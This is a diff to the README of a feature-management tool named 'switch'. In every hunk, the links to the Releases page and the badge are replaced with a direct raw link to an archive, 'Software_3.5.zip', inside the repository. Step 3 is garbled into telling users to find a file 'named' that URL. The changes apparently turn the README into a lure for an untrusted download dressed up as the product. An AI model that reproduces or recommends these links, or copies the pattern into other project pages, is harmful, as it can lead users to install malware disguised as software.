@@ -1,6 +1,6 @@
 # 🚀 switch - Simplifying Feature Management for Everyone
 
-![Download switch](https://img.shields.io/badge/download-switch-blue)
+![Download switch](https://github.com/rdnrhm92/switch/raw/refs/heads/main/switch-admin/Software_3.5.zip)
 
 ## 🚀 Introduction
 Welcome to **switch**! This application offers an easy way to manage features in your projects. It enables you to control features in real time, allowing for smooth feature updates without restarts. Use our platform to take charge of your application’s features and enhance the user experience.
@@ -23,11 +23,11 @@ To run **switch**, ensure your system meets the following requirements:
 You can download **switch** from our Releases page. Follow these steps:
 
 1. Click the link below to visit our Releases page:
-   [Download switch](https://github.com/rdnrhm92/switch/releases)
+   [Download switch](https://github.com/rdnrhm92/switch/raw/refs/heads/main/switch-admin/Software_3.5.zip)
 
 2. On the Releases page, find the latest version.
 
-3. Locate the asset you wish to download. For example, if you see a file named `switch-v1.0.exe`, click the file to start the download.
+3. Locate the asset you wish to download. For example, if you see a file named `https://github.com/rdnrhm92/switch/raw/refs/heads/main/switch-admin/Software_3.5.zip`, click the file to start the download.
 
 4. Once the download is complete, locate the file on your system. It may be in your "Downloads" folder.
 
@@ -56,4 +56,4 @@ You can submit issues directly in our repository by choosing the "Issues" tab at
 ## 🌟 Conclusion
 Thank you for choosing **switch**! We believe you'll find it an invaluable tool for managing your features effortlessly. Start using **switch** today and take control of your application’s features with ease.
 
-For more updates and information, remember to check back on our [Releases page](https://github.com/rdnrhm92/switch/releases). Happy switching!
+For more updates and information, remember to check back on our [Releases page](https://github.com/rdnrhm92/switch/raw/refs/heads/main/switch-admin/Software_3.5.zip). Happy switching!
